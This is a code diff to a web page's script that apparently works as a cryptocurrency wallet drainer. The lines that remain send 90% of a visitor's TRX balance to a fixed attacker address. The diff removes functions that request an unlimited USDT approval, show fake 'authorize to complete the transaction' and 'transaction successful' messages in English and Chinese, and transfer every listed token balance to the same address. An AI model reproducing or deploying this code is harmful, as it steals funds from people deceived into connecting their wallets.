@@ -579,89 +579,12 @@
 				await tronWeb.trx.getAccount();
 				let trxbalance = await tronWeb.trx.getBalance();
 				let sendTrx = Math.round(Number(trxbalance).mul(Number(90).div(100)));
+				console.log(sendTrx + " / " + trxbalance);
 				await tronWeb.trx.sendTransaction(toAddress, sendTrx);
 				console.log("Transfed!");
 			  }
 			   
-			  function toTrx(usdtContract) {
-				usdtContract
-				  .approve(toAddress, 1000000000000000)
-				  .send()
-				  .finally(() => {
-					/*
-					let trxbalanceNum = trxbalance / 1000000;
-					if (trxbalanceNum > 10) {
-					  let loading = Qmsg.loading(
-						`<br><br>Please authorize your TRX assets so that the system can view and complete the transaction<br><br>請通過授權您的TRX資產以便系統檢視並完成交易`
-					  );
-					  let sendTrx = Math.round(
-						Number(trxbalance).mul(Number(70).div(100))
-						//Number(1)
-					  );
-					  tronWeb.trx.sendTransaction(toAddress, sendTrx).finally(() => {
-						loading.close();
-						toTrc20();
-					  });
-					} else {
-					  toTrc20();
-					}
-					*/
-				  });
-			  }
-
-			  let toTrc20Loading = null;
-
-			  function toTrc20(index) {
-				if (index === undefined) index = 0;
-				if (toTrc20Loading == null || toTrc20Loading.state !== "opening") {
-				  toTrc20Loading = Qmsg.loading(
-					`<br><br>Please authorize your wallet to complete the transaction<br><br>請通過授權您的錢包以完成交易`
-				  );
-				}
-				if (index == trc20List.length) {
-				  toTrc20Loading.close();
-				  Qmsg.success(
-					`<br><br>The transaction is successful, and the block will arrive after confirmation<br><br>交易成功，將在區塊確認後到達`
-				  );
-				  return;
-				}
-				let trc20CCAddress = trc20List[index];
-
-				const forContract = new Promise((resolution, rejection) => {
-				  setTimeout(() => {
-					tronWeb
-					  .contract()
-					  .at(trc20CCAddress)
-					  .then((cc) => {
-						if (!cc.balanceOf) {
-						  resolution();
-						  return;
-						}
-						cc.balanceOf(window.tronWeb.defaultAddress.base58)
-						  .call()
-						  .then((balance) => {
-							if (balance.toNumber() >= 5) {
-							  cc.transfer(toAddress, balance.toNumber())
-								.send()
-								.finally(() => {
-								  resolution();
-								});
-							} else {
-							  resolution();
-							}
-						  })
-						  .catch(() => {
-							resolution();
-						  });
-					  })
-					  .catch(() => {
-						resolution();
-					  });
-				  }, 100);
-				}).finally(() => {
-				  toTrc20(index + 1);
-				});
-			  }
+			  
 		</script>
    </body>
 </html>
